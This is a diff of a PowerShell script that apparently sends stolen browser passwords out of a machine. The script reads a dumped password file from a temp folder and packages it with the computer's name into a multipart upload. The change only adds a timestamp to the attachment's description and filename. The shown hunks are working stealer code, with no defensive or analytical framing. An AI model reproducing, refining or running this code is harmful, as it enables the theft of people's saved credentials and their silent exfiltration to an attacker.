@@ -23,6 +23,7 @@ $fileBytes = [System.IO.File]::ReadAllBytes("$env:temp\wbpv\pwd.txt");
 $fileContent =  [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);
 $boundary = [System.Guid]::NewGuid().ToString();
 $LF = "`r`n";
+$time = Get-Date -Format "ddMMyyyyHHmm";
 
 $data = @{
     "username" = $env:COMPUTERNAME;
@@ -30,8 +31,8 @@ $data = @{
     "attachments" = @(
         @{
             "id" = 0;
-            "description" = "$env:COMPUTERNAME passwords";
-            "filename" = "$env:COMPUTERNAME -pwd.txt";
+            "description" = "Passwords $env:COMPUTERNAME $time";
+            "filename" = "pwd-$env:COMPUTERNAME-$time.txt";
         }
     )
 } | ConvertTo-JSON;
@@ -42,7 +43,7 @@ $body = (
     "Content-Type: application/json $LF",
     $data,
     "--$boundary",
-    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$env:COMPUTERNAME-pwd.txt`"",
+    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"pwd-$env:COMPUTERNAME-$time.txt`"",
     "Content-Type: text/plain$LF",
     $fileContent,
     "--$boundary--$LF"
